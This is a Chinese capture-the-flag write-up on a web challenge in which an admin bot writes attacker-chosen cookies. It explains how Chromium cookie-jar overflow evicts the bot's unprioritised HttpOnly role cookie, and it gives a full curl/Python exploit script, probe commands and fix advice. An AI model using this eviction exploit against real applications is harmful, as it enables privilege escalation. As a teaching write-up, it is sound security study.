# 分析-CookieCorp

**题目：**
```
"A Better Cookie for a Brighter Tomorrow!"

Welcome to CookieCorp, the Space Age's finest custom-cookie fabrication service. Design a batch from any ingredients you can dream up, then submit it to our tireless robotic Quality Inspector. Every recipe is loaded straight into the fabrication mixer for a full inspection.

Get your batch reviewed and you'll earn an official seal. But the truly legendary bakers — the ones whose recipes earn the Chief's Golden Seal — take home the grand prize.

Only the Chief can award that seal, though. And the Chief is a very busy robot.

Grab a Baker Badge and get fabricating.

https://tomorrow.web.2026.sunshinectf.games
```

## 基本信息

| 项 | 值 |
|---|---|
| 赛事 | SunshineCTF 2026（Web；2026-09-26 14:00 ～ 09-28 14:00 UTC 进行中） |
| 目标 | `https://tomorrow.web.2026.sunshinectf.games` |
| 站点伪装 | CookieCorp —— 太空时代饼干定制服务（料理配方 → 机器人质检员盖章） |
| 技术栈 | nginx + Express（`X-Powered-By: Express`）；前端 mixer.js 驱动质检流程 |
| 分析路径 | 纯黑盒（无附件）＋ 本地 Playwright/Chromium 复现机器人浏览器行为 |
| 核心考点 | 攻击者可控 Cookie 写入管理员机器人浏览器 → **Cookie Jar 溢出驱逐 HttpOnly role** → 注入 `role=chief` → Golden Seal |
| Flag | `sun{c00kie_jar_0verfl0w_ev1cts_the_chief}` |

> 题目名 "CookieCorp" 与全站"配方即 cookie（`name=value`）"的设定即为攻击面提示；flag 文本直接点名 `cookie jar overflow evicts the chief`。

## 信息收集（黑盒）

### 站点结构

| 路径 | 行为 |
|---|---|
| `/` | 首页：注册（Issue Badge）/ 登录（Clock In） |
| `POST /register`、`POST /login` | 下发 `session` + `role` 两个 HttpOnly Cookie（见下） |
| `/dashboard` | 当前用户批次列表、审查队列深度 |
| `/builder` | Fabricator：设计批次（title + 最多 **300** 个 ingredient，`name ≤48` / `value ≤64` 字符） |
| `POST /api/recipe` | 保存批次 → `{"ok":true,"id":"<hex>","ingredients":N}` |
| `/recipe/:id` | 批次状态页（draft / queued / reviewed / golden seal + flag） |
| `POST /api/recipe/:id/submit` | 提交审查 → **机器人（Quality Inspector）自动访问** `/review/:id` |
| `/review/:id` | "Inspector's-eye view"：把配方注入 `window.__recipe` 并加载 `mixer.js` 执行 |
| `POST /api/seal` | 机器人浏览器内由 `mixer.js` 调用，返回 `{"seal":"reviewed"|"chief"}`，服务端据此给批次盖章 |
| `/static/js/mixer.js` | 质检核心客户端逻辑（关键文件） |

存在内置账号：`chief`、`inspector`、`quality_inspector`、`admin`（注册同名返回 `username taken`）。

### 注册下发的 Cookie（整题伏笔）

```http
set-cookie: session=<64位hex>; Path=/; HttpOnly; Priority=High; SameSite=Lax
set-cookie: role=baker;       Path=/; HttpOnly;                SameSite=Lax
```

- `session` 带 **`Priority=High`**（Chromium 专有的 Cookie 优先级属性），`role` **不带**（默认 Medium）。
- 两个都是 HttpOnly；`Priority=High` 只对 **Cookie Jar 溢出时的驱逐顺序** 起作用——这处差异就是本题的题眼。

### 质检机制：mixer.js（重点）

`/review/:id` 页面把配方 JSON 内联为 `window.__recipe` 后加载：

```js
function dispense(ing) {
  document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';   // ← 把配方摊进"质检员浏览器"的 Cookie
}

async function run() {
  for (var i = 0; i < recipe.ingredients.length; i++) dispense(recipe.ingredients[i]);   // 逐个 dispense
  var resp = await fetch('/api/seal', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    credentials: 'same-origin',                        // ← 带上质检员自己的 session/role + 被注入的 Cookie
    body: JSON.stringify({ recipeId: recipe.id }),
  });
  // result.seal === 'chief'  → GOLDEN SEAL；'reviewed' → 标准章
}
```

即：**提交批次 → 机器人（inspector 会话）访问 `/review/:id` → 攻击者配方中的每个 ingredient 都被写进机器人的 Cookie Jar → 再以机器人身份携带这些 Cookie 调 `/api/seal`。**

### 输入清洗与限制（攻击者能做什么）

ingredient 的 `name`/`value` 服务端会剥离：空格、`;`、`"`、`,`、`=`（name 中）、换行/制表。实测对照：

| 输入 | 存储后 |
|---|---|
| `a b  c` | `abc` |
| `chief;path=/api` | `chiefpath=/api` |
| `a=b`（value） | `a=b`（value 保留 `=`；name 中被剥离） |
| `he"llo` | `hello` |

结论：**无法注入 Cookie 属性**（没有 `;` 就写不出 `path=`/`domain=`/`expires=`），所以经典的"同名不同路径 shadowing"不可用；且 `session`/`role` 均为 HttpOnly。

## 漏洞分析

### 漏洞点 1：把用户输入当 Cookie 写进特权浏览器

`document.cookie = ing.name + '=' + value + '; path=/'` 直接使用用户可控的 name/value——攻击者获得了"在质检员（管理员级）浏览器中写任意 Cookie（名与值）"的能力。这是本题的根漏洞。

### 漏洞点 2：HttpOnly = 只防读、也防同路径覆盖改写，但不防驱逐

本地用 Playwright/Chromium 复现：以 baker 登录后打开含 `role=chief` 配方的 `/review` 页，结果：

```
COOKIES BEFORE: [('session', …, '/', httpOnly=True), ('role', 'baker', '/', httpOnly=True)]
COOKIES AFTER:  [('session', …, '/', httpOnly=True), ('role', 'baker', '/', httpOnly=True)]
document.cookie: (空)
```

- 浏览器规范要求：非 HTTP API（JS）**不能替换同名、同域、同路径的 HttpOnly Cookie**（直接忽略），故 `role=chief` 这一步在"role 还存在"时无效。
- 质检 **鉴权走 session**（服务端将会话映射到 inspector）：实测 `session=baker + role=chief` 调 `/api/seal` → `403 {"error":"inspector authorization required"}`，伪造 role 无法通过鉴权。
- 但**盖章裁定读的是请求里的 `role` Cookie**（见攻击组/对照组差异）：inspector 的 `role` 一旦被换成 `chief`，裁定即为 Golden Seal。

矛盾在于：HttpOnly 挡住了覆盖，需要想办法**先让旧 `role` 消失，再写入新的 `role`**——Cookie Jar 溢出提供了这条路径。

### 漏洞点 3（核心）：Cookie Jar 溢出 + Priority 差异

Chromium 每个 host 的 Cookie 上限为 **180**，而本题配方上限是 **300** 个 ingredient（>180）。溢出时按优先级驱逐：**先驱逐 Medium，后驱逐 High**（同级内 LRU）：

- 机器人的 `session`：**High**（`Priority=High`）→ 溢出中被保护，鉴权不失效；
- 机器人的 `role=inspector`：**Medium** → 是溢出时被第一个驱逐的"老" Cookie；
- 我们注入的填充 Cookie 与被驱逐后的新 `role`：Medium，按写入顺序 LRU。

于是：把 **299 个填充 ingredient + 最后放 `{name:"role", value:"chief"}`**，dispense 循环进行到 ~179 个时旧 `role` 被驱逐，第 300 个 ingredient 成功写入**全新的 `role=chief`**（无人阻挡，因为旧 role 已不在 jar 里）且作为最新写入者在后续溢出中幸存。随后 `mixer.js` 的 `/api/seal` 请求同时携带 `session=inspector`（鉴权通过）与 `role=chief`（裁定 Golden），服务端盖章并下发布 flag。

> 设计暗示还原：`Priority=High` 只加在 `session` 上（保护鉴权）却漏了 `role`；上限 300 > 180；flag 名即解法——三处共同指向"溢出驱逐"。

## 攻击链总览

```
POST /register  （获得 baker 会话；观察 session=Priority=High / role=无 Priority）
   │
   ▼
POST /api/recipe  配方 = 299 个填充 ingredient + 末尾 {name:"role", value:"chief"}（共300）
   │
   ▼
POST /api/recipe/:id/submit  → 质检机器人(inspector 会话)打开 /review/:id
   │
   ▼  mixer.js 逐个 dispense 进机器人 Cookie Jar
Cookie Jar 溢出（>180）
   ├─ session (Priority=High)        → 幸存（鉴权保持有效）
   ├─ role=inspector (默认 Medium)   → 被 LRU 驱逐
   └─ 第300个 ingredient role=chief  → 成功写入新的 role Cookie 并幸存
   │
   ▼
mixer.js → POST /api/seal（credentials: same-origin）
   = session: inspector（鉴权通过） + role: chief（裁定生效）
   │
   ▼
服务端返回 {"seal":"chief"} → 批次页渲染 CHIEF'S GOLDEN SEAL
   │
   ▼
GET /recipe/:id → sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```

## 复现（端到端利用脚本）

```bash
BASE="https://tomorrow.web.2026.sunshinectf.games"
JAR="/tmp/cc.jar"
U="baker_$(date +%s)"; P="pass12345"

# 1) 注册 Baker Badge（注意响应里两个 Set-Cookie 的 Priority 差异）
curl -s -c "$JAR" -X POST "$BASE/register" -H 'content-type: application/json' \
  -d "{\"username\":\"$U\",\"password\":\"$P\"}"

# 2) 构造溢出配方：299 个填充 + 最后写 role=chief
python3 - <<'PYEOF' > /tmp/overflow.json
import json
ings = [{"name": f"f{i}", "value": f"v{i}"} for i in range(299)]
ings.append({"name": "role", "value": "chief"})   # 待旧 role 被驱逐后再写入
print(json.dumps({"title": "Golden Overflow", "ingredients": ings}))
PYEOF

# 3) 保存并提交审查（机器人自动复核）
RID=$(curl -s -b "$JAR" -X POST "$BASE/api/recipe" -H 'content-type: application/json' \
  --data @/tmp/overflow.json | jq -r .id)
curl -s -b "$JAR" -X POST "$BASE/api/recipe/$RID/submit"

# 4) 等待质检员复核，收取 Golden Seal
sleep 10
curl -s -b "$JAR" "$BASE/recipe/$RID" | grep -o 'sun{[^}]*}'
```

实测输出（当天靶机）：

```html
<div class="seal gold">
  <div style="font-family:'Audiowide';font-size:20px;color:#8a6d00">&#9733; CHIEF'S GOLDEN SEAL &#9733;</div>
  <div class="small-note">Certified by the CookieCorp Chief. Reward attached:</div>
  <div class="flag">sun{c00kie_jar_0verfl0w_ev1cts_the_chief}</div>
</div>
```

## 结果

- **Flag：`sun{c00kie_jar_0verfl0w_ev1cts_the_chief}`**
- 输出位置：`/recipe/<id>` 的 `div.seal.gold` 区块
- 实测批次：`5ecd1dfc19db4c721a07ef77`（"Overflow Golden Test 1"，300 ingredients）；对照批次 `5144fe85f3618c0149c60264`（300 填充、无 role）仅得 STANDARD SEAL

## 关键证据

1. **注册响应（Priority 差异）**：
   `session=…; Path=/; HttpOnly; Priority=High; SameSite=Lax` ／ `role=baker; Path=/; HttpOnly; SameSite=Lax`
2. **mixer.js 关键行**：`document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';` + `fetch('/api/seal', {credentials:'same-origin', body: JSON.stringify({recipeId})})`
3. **清洗实测**：`chief;path=/api` → `chiefpath=/api`（`;` 被剥离）→ 无法注入 Cookie 属性，shadowing 路线不可行
4. **Playwright 实测（同路径 HttpOnly 不可被 JS 覆盖）**：打开含 `role=chief` 的 review 页后 Cookie 仍为 `session + role=baker`，`document.cookie` 为空
5. **鉴权与裁定分离**：`session=baker + role=chief` 调 `/api/seal` → `403 {"error":"inspector authorization required"}`（鉴权看 session；裁定看 role）
6. **溢出对照组**：300 个填充（无 role）→ STANDARD SEAL（session 在溢出中幸存、鉴权通过，但没有 role=chief 就不给金印）
7. **溢出利用组**：299 填充 + 末尾 `role=chief` → CHIEF'S GOLDEN SEAL + flag（如上）

## 修复建议

1. **不要在特权浏览器中执行用户输入作为 Cookie**：审查页不应 "dispense" 任何 Cookie；如业务确需模拟，name/value 必须白名单化，绝不能到达 `document.cookie`。
2. **权限一律服务端裁定**：盖章等敏感判定只信任服务端会话（session store）；`role` 这类客户端可写 Cookie 不得参与授权逻辑；必须用时需签名（HMAC/JWE）。
3. **限制写入规模**：单次审查注入的 Cookie 数应远小于浏览器上限（Chromium 180/host）并留余量；机器人每次审查使用独立、用后即清的浏览器上下文。
4. **不要依赖 Cookie Jar 行为做安全边界**：`HttpOnly`/`Priority=High` 都不是防篡改机制——溢出驱逐照样能把受保护的会话角色清掉；本例中唯独 `role` 没享受 High 保护，反成突破口。

## 附：探测命令记录（curl）

```bash
BASE=https://tomorrow.web.2026.sunshinectf.games
JAR=/tmp/cc.jar

# 注册/登录，观察 Set-Cookie（session 有 Priority=High，role 没有）
curl -si -c $JAR -X POST $BASE/register -H 'content-type: application/json' \
  -d '{"username":"probe1","password":"pass12345"}'

# 看质检员的客户端逻辑（本题目录）
curl -s $BASE/static/js/mixer.js

# 直接调 /api/seal 观察鉴权（baker 会话必 403）
SID=$(awk '$6=="session"{print $7}' $JAR)
curl -s -X POST $BASE/api/seal -H "Cookie: session=$SID; role=chief" \
  -H 'content-type: application/json' -d '{"recipeId":"<id>"}'
# → {"error":"inspector authorization required"}
```
